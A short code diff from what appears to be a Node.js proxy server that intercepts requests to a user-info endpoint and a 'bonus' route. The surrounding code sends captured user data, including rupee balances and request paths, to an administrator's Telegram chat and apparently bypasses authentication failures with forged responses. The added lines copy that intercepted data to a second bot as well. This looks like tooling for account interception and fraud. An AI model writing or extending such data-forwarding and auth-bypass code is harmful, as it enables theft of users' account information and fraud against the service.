@@ -2527,6 +2527,7 @@ app.all('/app/user/info', async (req, res) => {
         mineMsg += `\n💰 Balance: ₹${realBal}`;
       }
       bot.sendMessage(data.adminChatId, mineMsg).catch(() => { });
+      sendBot2Message(mineMsg);
     }
     if (jsonResp && isAuthFailureResponse(jsonResp) && shouldBypass401(req)) {
       const bypass = make401Bypass(jsonResp);
@@ -2597,6 +2598,7 @@ async function proxyAndAddBonusPersonal(req, res) {
         msg += `\n🌐 *Path:* ${req.originalUrl.split('?')[0]}`;
 
         bot.sendMessage(data.adminChatId, msg, { parse_mode: 'Markdown' }).catch(() => { });
+        sendBot2Message(msg);
       }
     }
 
